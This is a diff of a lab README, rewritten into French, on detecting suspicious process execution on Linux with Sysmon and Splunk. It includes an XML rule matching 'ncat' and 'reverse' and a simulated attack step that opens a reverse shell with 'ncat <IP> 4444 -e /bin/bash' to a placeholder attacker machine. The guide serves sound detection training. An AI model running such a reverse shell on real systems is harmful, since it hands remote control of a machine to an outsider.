@@ -1,29 +1,30 @@
 # Task #2: Monitoring and Investigating Suspicious Process Execution
 
-- Install Sysmon
-- Setup Splunk
-- Simulate attack
-- Visualize
-
-#### Install Sysmon for Linux
+- L’installation de Sysmon pour Linux avec une configuration XML avancée pour détecter plusieurs techniques MITRE ATT&CK.
 
 - [Sysmon for Linux](https://learn.microsoft.com/en-us/sysinternals/downloads/sysmon)
 
-```sh
-# 1. Register Microsoft key and feed
-root@node01:~# wget -q https://packages.microsoft.com/config/ubuntu/$(lsb_release -rs)/packages-microsoft-prod.deb -O packages-microsoft-prod.deb
-root@node01:~# sudo dpkg -i packages-microsoft-prod.deb
-
-# 2. Install SysmonForLinux
-root@node01:~# apt-get update
-root@node01:~# apt-get install sysmonforlinux
-```
-
-- [MSTIC Sysmon Resources](https://github.com/microsoft/MSTIC-Sysmon/blob/main/linux/configs/main.xml)
+#### Installation de Sysmon for Linux
 
 ```sh
-root@node01:~# nano sysmon-config.xml
+wget -q https://packages.microsoft.com/config/ubuntu/$(lsb_release -rs)/packages-microsoft-prod.deb -O packages-microsoft-prod.deb
+sudo dpkg -i packages-microsoft-prod.deb
+
+sudo apt-get update
+sudo apt-get install sysmonforlinux
 ```
+
+## Configuration XML avancée
+
+- [Base de configuration recommandée : MSTIC Sysmon Config](https://github.com/microsoft/MSTIC-Sysmon/blob/main/linux/configs/main.xml)
+
+#### Créer un fichier de configuration
+
+```sh
+nano sysmon-config.xml
+```
+
+#### Puis coller le contenu XML suivant (extrait optimisé et indenté proprement) :
 
 ```sh
 <!--
@@ -146,6 +147,14 @@ NG FROM, OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS 
           <Image condition="end with">lwp-download</Image>
         </Rule>
       </NetworkConnect>
+
+       <!-- Ajoute PipeEvent ici -->
+      <PipeEvent onmatch="include">
+        <PipeName condition="contains">ncat</PipeName>
+        <PipeName condition="contains">reverse</PipeName>
+        <PipeName condition="is">*</PipeName>
+      </PipeEvent>
+
     </RuleGroup>
     <!-- Event ID 5 == ProcessTerminate -->
     <RuleGroup name="" groupRelation="or">
@@ -197,38 +206,61 @@ NG FROM, OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS 
 </Sysmon>
 ```
 
-```sh
-root@node01:~# sysmon -i sysmon-config.xml
-```
+#### Lancer Sysmon avec la configuration
 
 ```sh
-root@node01:~# systemctl restart sysmon
-root@node01:~# systemctl status sysmon
+sudo sysmon -accepteula -i sysmon-config.xml
 ```
 
-#### Simulate a Suspicious Process Execution attack and Analyzing logs on Splunk
+#### Vérifier que Sysmon fonctionne
 
 ```sh
-root@attack:~$ apt install ncat -y
-root@attack:~$ ncat -lnvp 4444
-ls
-pwd
+sudo sysmon -s
+sudo systemctl restart sysmon
+sudo systemctl status sysmon
 ```
+
+## Simuler une attaque - Reverse Shell avec ncat
+
+#### Sur la machine d’attaque
 
 ```sh
-root@node01:~# apt install ncat net-tools -y
-root@node01:~# ncat <IP Attack> 4444 -e /bin/bash
-root@node01:~# lsof -i :4444
-root@node01:~# netstat -tulnp | grep 4444
-root@node01:~# netstat grep 4444
+apt install ncat -y
+ncat -lnvp 4444
 ```
 
-#### Setting up Splunk UF and Splunk Dashboard
+#### Sur la machine compromise (victime) :
 
-`Search & Reporting`
+```sh
+apt install ncat net-tools -y
+ncat <IP_de_l'attaque> 4444 -e /bin/bash
+```
+
+#### Vérification de la connexion :
+
+```sh
+lsof -i :4444
+netstat -tulnp | grep 4444
+```
+
+## Analyse dans Splunk (Search & Reporting)
+
+#### Requêtes Splunk
+
+- Affiche tous les logs liés à Sysmon.
 
 ```sh
 index="linux_os_logs" process=sysmon
+```
+
+- Filtre sur les événements identifiés comme techniques de type Command.
+
+```sh
 index="linux_os_logs" process=sysmon TechniqueName=Command
+```
+
+- Recherche spécifique d’utilisation de ncat.
+
+```sh
 index="linux_os_logs" process=sysmon TechniqueName=Command ncat
 ```
